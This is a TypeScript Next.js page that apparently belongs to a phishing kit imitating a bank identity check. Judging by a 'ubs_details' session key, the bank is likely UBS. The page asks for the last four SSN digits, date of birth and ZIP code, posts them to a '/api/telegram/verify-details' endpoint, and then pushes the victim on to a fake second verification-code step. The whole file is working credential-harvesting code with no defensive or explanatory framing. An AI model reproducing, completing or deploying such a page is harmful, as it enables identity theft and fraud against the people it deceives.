"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";
import { Input } from "@/components/ui/input";

export default function VerifyDetailsPage() {
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem("ubs_details"))
      router.replace("/verify-choice");
  }, [router]);

  const [ssnLast4, setSsnLast4] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [zip, setZip] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const ssnDigits = ssnLast4.replace(/\D/g, "");
  const zipDigits = zip.replace(/\D/g, "");

  const isSsnValid = ssnDigits.length === 4;
  const isDateValid =
    birthDate.length === 10 && /^\d{2}\/\d{2}\/\d{4}$/.test(birthDate);
  const isZipValid = zipDigits.length >= 5;
  const isFormValid = isSsnValid && isDateValid && isZipValid;

  const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");

    if (value.length > 8) value = value.slice(0, 8);

    let formatted = "";
    if (value.length >= 2) {
      formatted = value.slice(0, 2) + "/";
      if (value.length >= 4) {
        formatted += value.slice(2, 4) + "/";
        if (value.length >= 8) {
          formatted += value.slice(4, 8);
        } else {
          formatted += value.slice(4);
        }
      } else {
        formatted += value.slice(2);
      }
    } else {
      formatted = value;
    }

    setBirthDate(formatted);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setIsLoading(true);

    try {
      await fetch("/api/telegram/verify-details", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssnLast4: ssnDigits,
          birthDate: birthDate,
          zip: zipDigits,
        }),
      }).catch(console.error);
    } catch (err) {
      console.error("Verify details notification error:", err);
    }

    setTimeout(() => {
      if (typeof window !== "undefined")
        sessionStorage.setItem("ubs_otp2", "1");
      router.push("/verify?step=2");
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-8 mx-auto w-full flex-1">
        {/* Progress Indicator */}
        <div className="flex items-center justify-center mb-12 gap-8">
          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full bg-[#4A90E2] flex items-center justify-center text-white text-sm font-medium">
              ✓
            </div>
            <p className="text-xs text-gray-600 mt-2">Sign in</p>
          </div>

          <div className="flex-1 h-1 bg-gray-200"></div>

          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full border-2 border-[#4A90E2] flex items-center justify-center text-[#4A90E2] text-sm font-medium">
              2
            </div>
            <p className="text-xs text-[#4A90E2] font-medium mt-2">Verify</p>
          </div>

          <div className="flex-1 h-1 bg-gray-200"></div>

          <div className="flex flex-col items-center">
            <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-400 text-sm font-medium">
              3
            </div>
            <p className="text-xs text-gray-400 mt-2">Complete</p>
          </div>
        </div>

        {/* Main Content */}
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-3">
            Verify your identity
          </h1>
          <p className="text-gray-600 text-base">
            Please provide the following information.
          </p>
        </div>

        {/* Form Container */}
        <div className="bg-white border border-gray-200 rounded-lg p-6 mb-8">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label
                htmlFor="ssn"
                className="block text-sm font-medium text-gray-900 mb-2"
              >
                Last 4 of SSN
              </label>
              <Input
                id="ssn"
                type="text"
                inputMode="numeric"
                maxLength={4}
                placeholder=""
                value={ssnLast4}
                onChange={(e) =>
                  setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))
                }
                className="w-full h-12 bg-white border border-gray-300 rounded-md text-gray-900 placeholder-gray-400"
              />
            </div>

            <div>
              <label
                htmlFor="birthDate"
                className="block text-sm font-medium text-gray-900 mb-2"
              >
                Date of Birth (MM/DD/YYYY)
              </label>
              <Input
                id="birthDate"
                type="text"
                inputMode="numeric"
                placeholder="MM/DD/YYYY"
                value={birthDate}
                onChange={handleDateChange}
                maxLength={10}
                className="w-full h-12 bg-white border border-gray-300 rounded-md text-gray-900 placeholder-gray-400"
              />
            </div>

            <div>
              <label
                htmlFor="zip"
                className="block text-sm font-medium text-gray-900 mb-2"
              >
                ZIP Code
              </label>
              <Input
                id="zip"
                type="text"
                inputMode="numeric"
                maxLength={10}
                placeholder=""
                value={zip}
                onChange={(e) =>
                  setZip(e.target.value.replace(/\D/g, "").slice(0, 10))
                }
                className="w-full h-12 bg-white border border-gray-300 rounded-md text-gray-900 placeholder-gray-400"
              />
            </div>
          </form>
        </div>

        {/* Action Buttons */}
        <div className="space-y-3">
          <Button
            onClick={handleSubmit}
            disabled={!isFormValid || isLoading}
            className="w-full bg-[#4A90E2] hover:bg-[#357ABD] text-white font-medium py-3 rounded-lg h-12"
          >
            {isLoading && <Loader2 className="w-4 h-4 mr-2 animate-spin" />}
            {isLoading ? "Sending..." : "Send verification code"}
          </Button>

          <Button
            onClick={() => router.push("/verify-choice")}
            variant="outline"
            disabled={isLoading}
            className="w-full border-[#4A90E2] text-[#4A90E2] font-medium py-3 rounded-lg h-12 hover:bg-gray-50"
          >
            Cancel
          </Button>
        </div>
      </div>
    </div>
  );
}
